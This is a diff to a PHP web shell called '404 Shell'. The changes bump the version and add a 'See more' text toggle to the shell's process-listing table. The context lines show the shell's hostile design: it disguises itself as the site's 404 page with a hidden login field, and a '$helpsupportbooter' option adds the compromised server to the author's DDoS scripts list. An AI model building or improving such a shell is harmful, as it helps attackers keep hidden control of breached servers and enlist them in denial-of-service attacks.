@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.01;
+$version            = 3.1;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -314,6 +314,9 @@ echo '<html>
 <meta http-equiv="Content-Type" content="text/html; charset=gbk">
 <title>404 Shell - Version ' . $version . '</title>
 <style>
+.morecontent span {
+	display: none;
+}
 #containertop .rowtop {
   margin: 0;
   padding: 0;
@@ -365,6 +368,46 @@ u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-r
 window.onbeforeunload = function(){
     return \'Are you sure you want to leave?\';
 };
+ document.onreadystatechange = function() {
+     if (document.readyState == "complete") {
+         var showChar = 100;
+         var classes = document.getElementsByClassName(\'more\');
+         for (var i = 0; i < classes.length; ++i) {
+             var item = classes[i];
+             var content = item.innerHTML;
+             if (content.length > showChar) {
+                 var c = content.substr(0, showChar);
+                 var h = content.substr(showChar, content.length - showChar);
+
+                 var html = c + \'<span class="moreelipses">...</span><span class="morecontent"><span>\' + h + \'</span>&nbsp;&nbsp;<a href="javascript:void(0)" class="morelink">See more</a></span>\';
+                 item.innerHTML = html;
+             }
+         }
+         var buts = document.getElementsByClassName(\'morelink\');
+         for (var j = 0; j < buts.length; ++j) {
+             buts[j].addEventListener("click", function() {
+                 if (this.classList.contains("less")) {
+                     this.classList.remove("less");
+                     this.innerHTML = "See more";
+                 } else {
+                     this.classList.add("less");
+                     this.innerHTML = "See less";
+                 }
+                 if (this.parentNode.children[0].style.display == "inline") {
+                     this.parentNode.children[0].style.display = "none";
+                 } else {
+                     this.parentNode.children[0].style.display = "inline";
+                 }
+                 if (this.parentNode.parentNode.children[0].style.display == "none") {
+                     this.parentNode.parentNode.children[0].style.display = "inline";
+                 } else {
+                     this.parentNode.parentNode.children[0].style.display = "none";
+                 }
+                 return false;
+             });
+         }
+     }
+ }
 function CheckAll(form) {
 	for(var i=0;i<form.elements.length;i++) {
 		var e = form.elements[i];
@@ -1437,7 +1480,7 @@ $wcount = 11;
             p('<td width="2%" nowrap><input name="pid[]" type="checkbox" value="' . $pid. '"></td>');
                         p('<td>' . $psln[0] . '</td>');
                         p('<td>' . $pid . '</td>');
-                        p('<td>' . $psln[10] . '</td>');
+                        p('<td><div class="more">' . $psln[10] . '</div></td>');
                         p('<td>' . $psln[2] . '</td>');
                         p('<td>' . $psln[3] . '</td>');
                         p('<td>' . $psln[4] . '</td>');
